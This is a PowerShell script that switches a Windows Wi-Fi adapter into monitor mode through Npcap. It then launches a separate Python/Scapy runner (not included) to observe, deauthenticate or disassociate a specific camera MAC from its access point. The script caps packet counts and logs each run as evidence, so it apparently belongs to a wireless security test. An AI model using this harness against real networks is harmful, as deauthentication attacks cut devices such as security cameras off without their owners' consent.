param(
    [ValidateSet("probe", "observe", "deauth", "disassoc", "restore")]
    [string]$Mode = "probe",

    [string]$WifiName = "Wi-Fi",
    [int]$Channel = 0,
    [string]$CameraMac = "dc:62:79:8b:3a:da",
    [string]$ApBssid = "",

    [ValidateRange(1, 3)]
    [int]$Count = 1,

    [ValidateRange(10, 300)]
    [int]$ObserveSeconds = 45,

    [switch]$InstallPythonDeps
)

$ErrorActionPreference = "Stop"

function Test-IsAdministrator {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Assert-Mac([string]$Value, [string]$Name) {
    if ($Value -notmatch '^(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$') {
        throw "$Name is not a valid MAC address: $Value"
    }
}

function Get-WlanHelper {
    $candidates = @(
        "$env:WINDIR\System32\Npcap\WlanHelper.exe",
        "$env:ProgramFiles\Npcap\WlanHelper.exe"
    )
    foreach ($candidate in $candidates) {
        if (Test-Path $candidate) { return $candidate }
    }
    return $null
}

function Assert-EthernetOnline {
    $eth = Get-NetAdapter -ErrorAction SilentlyContinue |
        Where-Object {
            $_.Status -eq "Up" -and
            $_.Name -ne $WifiName -and
            ($_.InterfaceDescription -match '(?i)ethernet|i225|i226|gbe|2\.5gbe|10gbe' -or $_.Name -match '(?i)ethernet')
        } |
        Select-Object -First 1

    if (-not $eth) {
        Write-Warning "No active Ethernet adapter was detected. Monitor mode will disconnect Wi-Fi."
    }
    else {
        Write-Host "[+] Ethernet remains online: $($eth.Name) / $($eth.InterfaceDescription)"
    }
}

if (-not (Test-IsAdministrator)) {
    throw "Run this script from an elevated PowerShell (Run as Administrator)."
}

Assert-Mac $CameraMac "CameraMac"
if ($ApBssid) { Assert-Mac $ApBssid "ApBssid" }

$wifi = Get-NetAdapter -Name $WifiName -ErrorAction SilentlyContinue
if (-not $wifi) {
    throw "Windows Wi-Fi adapter '$WifiName' was not found. Run Get-NetAdapter to verify its friendly name."
}

$helper = Get-WlanHelper
if (-not $helper) {
    throw @"
Npcap WlanHelper.exe was not found.
Install the current Npcap from the official Npcap installer and ENABLE:
  Support raw 802.11 traffic (and monitor mode) for wireless adapters
Then reopen an elevated PowerShell and rerun this script.
Expected helper path:
  $env:WINDIR\System32\Npcap\WlanHelper.exe
"@
}

Assert-EthernetOnline

Write-Host "[+] Wi-Fi adapter: $($wifi.InterfaceDescription)"
Write-Host "[+] Npcap helper: $helper"

if ($Mode -eq "restore") {
    Write-Host "[+] Restoring '$WifiName' to managed mode"
    & $helper $WifiName mode managed
    if ($LASTEXITCODE -ne 0) { throw "WlanHelper failed to restore managed mode." }
    & $helper $WifiName mode
    exit 0
}

Write-Host ""
Write-Host "=== Native Wi-Fi capabilities reported by WlanHelper ==="
$modes = (& $helper $WifiName modes) -join "`n"
if ($LASTEXITCODE -ne 0) {
    throw "WlanHelper could not query operation modes for '$WifiName'."
}
Write-Host $modes

$currentMode = ((& $helper $WifiName mode) -join "`n").Trim()
Write-Host "Current mode: $currentMode"

if ($modes -notmatch '(?i)(^|,|\s)monitor($|,|\s)') {
    throw @"
The MediaTek/Windows driver does not advertise Network Monitor mode through Native Wi-Fi.
The internal adapter cannot be used by this native-Windows path with the current driver.
"@
}

if ($Mode -eq "probe") {
    Write-Host ""
    Write-Host "[+] Monitor mode is advertised. Performing a reversible monitor-mode probe."
    & $helper $WifiName mode monitor
    if ($LASTEXITCODE -ne 0) {
        throw "The driver advertises monitor mode, but switching to it failed."
    }

    $after = ((& $helper $WifiName mode) -join "`n").Trim()
    Write-Host "[+] Mode after switch: $after"

    if ($Channel -gt 0) {
        Write-Host "[+] Setting monitor channel to $Channel"
        & $helper $WifiName channel $Channel
        if ($LASTEXITCODE -ne 0) { throw "Failed to set channel $Channel." }
        Write-Host "[+] Channel: $((& $helper $WifiName channel) -join '')"
    }

    Write-Host ""
    Write-Host "[+] Restoring managed mode after probe"
    & $helper $WifiName mode managed
    if ($LASTEXITCODE -ne 0) { throw "Probe worked, but restoring managed mode failed. Run with -Mode restore." }

    Write-Host "[+] Native monitor-mode probe succeeded."
    Write-Host "[i] Next step: rerun with -Mode observe -Channel <camera AP channel>."
    exit 0
}

if ($Channel -lt 1 -or $Channel -gt 196) {
    throw "-Channel is required for observe/deauth/disassoc (example: -Channel 6)."
}
if ($Mode -in @("deauth", "disassoc") -and -not $ApBssid) {
    throw "-$Mode requires -ApBssid with the legitimate AP BSSID."
}

$repoRoot = (Resolve-Path (Join-Path $PSScriptRoot "..")).Path
$pythonScript = Join-Path $PSScriptRoot "s1_rf_windows_native.py"
if (-not (Test-Path $pythonScript)) {
    throw "Missing Python runner: $pythonScript"
}

if ($InstallPythonDeps) {
    Write-Host "[+] Installing Python dependency: scapy"
    python -m pip install -r (Join-Path $repoRoot "requirements-rf-windows.txt")
    if ($LASTEXITCODE -ne 0) { throw "pip install failed." }
}

python -c "import scapy.all" 2>$null
if ($LASTEXITCODE -ne 0) {
    throw "Scapy is missing. Rerun with -InstallPythonDeps."
}

Write-Host "[+] Switching '$WifiName' to monitor mode"
& $helper $WifiName mode monitor
if ($LASTEXITCODE -ne 0) { throw "Failed to enter monitor mode." }

try {
    Write-Host "[+] Setting channel $Channel"
    & $helper $WifiName channel $Channel
    if ($LASTEXITCODE -ne 0) { throw "Failed to set channel $Channel." }

    $timestamp = (Get-Date).ToUniversalTime().ToString("yyyyMMddTHHmmssZ")
    $outDir = Join-Path $repoRoot "evidence\runs\$timestamp-s1-rf-native-$Mode"
    New-Item -ItemType Directory -Force -Path $outDir | Out-Null

    $pyArgs = @(
        $pythonScript,
        "--interface", $WifiName,
        "--camera-mac", $CameraMac,
        "--action", $Mode,
        "--count", $Count,
        "--observe-seconds", $ObserveSeconds,
        "--out", $outDir
    )
    if ($ApBssid) { $pyArgs += @("--ap-bssid", $ApBssid) }

    Write-Host "[+] Starting native Windows RF trial"
    Write-Host "    action=$Mode count=$Count channel=$Channel camera=$CameraMac"
    & python @pyArgs
    if ($LASTEXITCODE -ne 0) { throw "Native RF Python trial failed." }

    Write-Host ""
    Write-Host "[+] Evidence written to: $outDir"
}
finally {
    Write-Host "[+] Restoring '$WifiName' to managed mode"
    & $helper $WifiName mode managed | Out-Host
}
